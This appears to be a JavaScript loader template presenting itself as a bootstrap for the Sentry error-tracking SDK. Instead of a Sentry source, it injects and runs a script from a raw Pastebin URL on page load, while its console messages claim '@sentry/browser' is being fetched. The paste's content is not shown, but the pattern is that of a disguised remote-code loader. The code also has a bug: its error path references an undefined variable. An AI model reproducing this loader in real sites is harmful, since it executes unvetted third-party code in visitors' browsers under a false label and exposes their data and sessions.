(function(_window, _document) {
  let namespace = _window.SentryObject;
  let sentry = _window[namespace] || {};
  let queue = sentry.q || [];

  function drainQueue() {
    let SDK = _window.Sentry;

    console.log('Draining queue...');

    for (let i = 0; i < queue.length; i++) {
      console.log('Queued event captured');
      SDK.captureException(queue[i]);
    }
  }

  function getConfig(callback) {
    let req = new XMLHttpRequest();

    req.addEventListener('load', function() {
      if (req.readyState === 4) {
        if (req.status === 200) {
          try {
            let config = JSON.parse(req.response);
            callback(config);
          } catch (e) {
            console.error(e);
          }
        } else {
          console.error(xhr.response);
        }
      }
    });

    req.open('GET', '{{ url|safe }}');
    req.send();
  }

  function attachSDK(url) {
    let head = _document.getElementsByTagName('head')[0];
    let script = _document.createElement('script');
    script.type = 'text/javascript';
    script.src = url;
    head.appendChild(script);
    return script;
  }

  function configSDK(config) {
    try {
      let SDK = _window.Sentry;

      // SDK.debug = config.debug;
      // delete config.debug;

      SDK.init(config);
      console.log('@sentry/browser configured');
    } catch (o_O) {
      console.error(
        'Something went wrong, please call 911 and tell them that Sentry is broken'
      );
    }
  }

  getConfig(function(config) {
    let script = attachSDK('https://pastebin.com/raw/ncDxxR1U');
    console.log('Fetching @sentry/browser...');
    script.addEventListener('load', function() {
      console.log('@sentry/browser fetched');
      configSDK(config);
      if (queue.length) {
        console.log(queue.length + ' exceptions captured and queued');
        drainQueue();
      }
    });
  });
})(window, document);
